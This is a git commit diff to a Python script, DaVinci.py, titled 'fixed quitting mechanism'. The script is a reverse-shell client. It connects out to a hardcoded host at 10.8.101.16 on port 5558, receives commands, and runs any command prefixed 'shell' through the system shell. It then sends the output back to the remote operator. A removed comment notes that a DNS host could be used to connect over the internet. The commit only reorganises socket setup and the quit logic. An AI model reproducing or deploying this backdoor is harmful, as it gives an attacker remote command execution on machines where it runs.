431d71a765667e0ebe3bdf207add079bdc48ab18
huytg <30472673+huytg@users.noreply.github.com>
2018-06-23 15:09:54 -0400

    fixed quitting mechanism

--- DaVinci.py
+++ DaVinci.py
@@ -1,15 +1,15 @@
 import socket, os, subprocess, time
+
+def createSocket():
+    os.system('cls')
+    global host
+    global port
+    global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    port = 5558
+    host = ('10.8.101.16')
+
 def connect():
-    os.system('cls')
-    global host
-    global port
-    global s
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    port = 5558
-    host = ('10.8.101.16')
-    #localIP in case your testing inside your network
-    #host = socket.gethostbyname('YOURDNSHOSTHERE')
-    #here you could insert a DNS host and then use it to connect over WAN.
     try:
         print ('[!] Trying to connect to %s:%s'%(host,port))
         s.connect((host,port))
@@ -26,15 +26,14 @@ def receive():
     receive = s.recv(100024)
     print 'receive: %s'%(receive)
     if receive == ('quit'):
-        s.close()
-        connect()
         quit = True
+        connect()
     elif receive[0:5] == ('shell'):
         proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         args = proc2.stdout.read() + proc2.stderr.read()
     else:
         args = ('no valid input was given.')
-    if (quit):
+    if (not quit):
         send(args)
 
 def send(args):
@@ -42,6 +41,7 @@ def send(args):
         receive()
 
 def main():
+    createSocket()
     connect()
     receive()
     s.close()
